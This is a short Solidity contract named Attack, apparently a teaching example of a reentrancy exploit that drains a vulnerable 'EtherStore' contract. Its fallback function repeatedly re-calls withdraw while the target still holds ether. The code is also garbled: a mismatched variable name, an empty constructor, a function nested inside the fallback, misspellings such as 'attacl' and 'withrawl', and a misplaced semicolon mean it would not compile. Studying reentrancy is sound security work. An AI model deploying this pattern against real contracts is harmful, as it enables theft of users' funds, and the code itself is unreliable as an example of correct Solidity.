contract Attack {
    EtherStore public ether;

    constructor(address _etherStoreAddress) public {

    }
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
        function attacl() external payable {
            require(msg.value >= 1 ether;)
            // 0.5
            // etherStore.deposit.value(1 ether)();
            // 0.6
            etherStore.deposit{value: 1 ether}();
            etherStore.withrawl(1 ether);
        }
    }
}